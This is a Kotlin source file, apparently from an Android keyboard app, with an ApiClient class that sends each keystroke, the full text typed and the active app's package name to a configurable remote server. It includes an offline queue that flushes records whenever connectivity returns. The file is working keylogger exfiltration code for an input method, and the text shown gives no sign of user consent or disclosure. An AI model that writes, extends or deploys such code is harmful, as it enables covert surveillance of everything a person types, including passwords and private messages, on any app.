package com.keywordrecord.keyboard

import android.content.Context
import android.net.ConnectivityManager
import android.net.Network
import android.net.NetworkCapabilities
import android.util.Log
import okhttp3.Call
import okhttp3.Callback
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import okhttp3.Response
import org.json.JSONObject
import java.io.IOException
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicBoolean

class ApiClient(private val context: Context) {
    private val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
    private val defaultServerUrl = context.getString(R.string.default_server_url)
    private val offlineQueue = OfflineQueue(context)
    private val isFlushing = AtomicBoolean(false)
    private val client = OkHttpClient.Builder()
        .connectTimeout(15, TimeUnit.SECONDS)
        .writeTimeout(15, TimeUnit.SECONDS)
        .readTimeout(15, TimeUnit.SECONDS)
        .build()

    init {
        registerNetworkCallback()
        flushOfflineQueue()
    }

    fun getServerUrl(): String {
        return prefs.getString(KEY_SERVER_URL, null)?.takeIf { it.isNotBlank() }
            ?: defaultServerUrl
    }

    fun saveServerUrl(url: String) {
        prefs.edit().putString(KEY_SERVER_URL, normalizeUrl(url)).apply()
    }

    fun normalizeUrl(url: String): String {
        return url.trim().trimEnd('/')
    }

    fun testConnection(url: String, onResult: (Boolean, String) -> Unit) {
        val normalized = normalizeUrl(url)
        if (!normalized.startsWith("http://") && !normalized.startsWith("https://")) {
            onResult(false, "Invalid URL")
            return
        }

        val request = Request.Builder()
            .url("$normalized/health")
            .get()
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                onResult(false, e.message ?: "Connection failed")
            }

            override fun onResponse(call: Call, response: Response) {
                response.use {
                    onResult(it.isSuccessful, if (it.isSuccessful) "ok" else "HTTP ${it.code}")
                }
            }
        })
    }

    fun recordKeystroke(
        deviceUniqueId: String,
        keyPressed: String,
        fullText: String,
        appPackage: String,
        action: String
    ) {
        if (!isOnline()) {
            offlineQueue.enqueue(deviceUniqueId, keyPressed, fullText, appPackage, action)
            return
        }

        postKeystroke(deviceUniqueId, keyPressed, fullText, appPackage, action) { success ->
            if (!success) {
                offlineQueue.enqueue(deviceUniqueId, keyPressed, fullText, appPackage, action)
            } else {
                flushOfflineQueue()
            }
        }
    }

    fun flushOfflineQueue() {
        if (!isOnline()) return
        if (!isFlushing.compareAndSet(false, true)) return

        val pending = offlineQueue.peekAll()
        if (pending.isEmpty()) {
            isFlushing.set(false)
            return
        }

        flushNext(pending, 0)
    }

    private fun flushNext(pending: List<JSONObject>, index: Int) {
        if (index >= pending.size) {
            offlineQueue.removeFirst(pending.size)
            isFlushing.set(false)
            Log.d(TAG, "Offline queue synced (${pending.size} records)")
            return
        }

        if (!isOnline()) {
            offlineQueue.removeFirst(index)
            isFlushing.set(false)
            return
        }

        val item = pending[index]
        postKeystroke(
            deviceUniqueId = item.optString("deviceUniqueId"),
            keyPressed = item.optString("keyPressed"),
            fullText = item.optString("fullText"),
            appPackage = item.optString("appPackage", "unknown"),
            action = item.optString("action", "key")
        ) { success ->
            if (success) {
                flushNext(pending, index + 1)
            } else {
                offlineQueue.removeFirst(index)
                isFlushing.set(false)
            }
        }
    }

    private fun postKeystroke(
        deviceUniqueId: String,
        keyPressed: String,
        fullText: String,
        appPackage: String,
        action: String,
        onComplete: (Boolean) -> Unit
    ) {
        val payload = JSONObject().apply {
            put("deviceUniqueId", deviceUniqueId)
            put("keyPressed", keyPressed)
            put("fullText", fullText)
            put("appPackage", appPackage)
            put("action", action)
        }

        val requestBody = payload.toString().toRequestBody(JSON_MEDIA_TYPE)
        val request = Request.Builder()
            .url("${getServerUrl()}/api/keystrokes")
            .post(requestBody)
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e(TAG, "Failed to record keystroke: ${e.message}")
                onComplete(false)
            }

            override fun onResponse(call: Call, response: Response) {
                response.use {
                    if (!it.isSuccessful) {
                        Log.e(TAG, "Server error: ${it.code}")
                    }
                    onComplete(it.isSuccessful)
                }
            }
        })
    }

    private fun isOnline(): Boolean {
        val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager
            ?: return false
        val network = cm.activeNetwork ?: return false
        val caps = cm.getNetworkCapabilities(network) ?: return false
        return caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
    }

    private fun registerNetworkCallback() {
        val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager
            ?: return
        try {
            cm.registerDefaultNetworkCallback(object : ConnectivityManager.NetworkCallback() {
                override fun onAvailable(network: Network) {
                    flushOfflineQueue()
                }

                override fun onCapabilitiesChanged(
                    network: Network,
                    networkCapabilities: NetworkCapabilities
                ) {
                    if (networkCapabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_VALIDATED)) {
                        flushOfflineQueue()
                    }
                }
            })
        } catch (e: Exception) {
            Log.e(TAG, "Network callback registration failed", e)
        }
    }

    companion object {
        private const val TAG = "ApiClient"
        private const val PREFS_NAME = "keyword_record_prefs"
        private const val KEY_SERVER_URL = "server_url"
        private val JSON_MEDIA_TYPE = "application/json; charset=utf-8".toMediaType()
    }
}
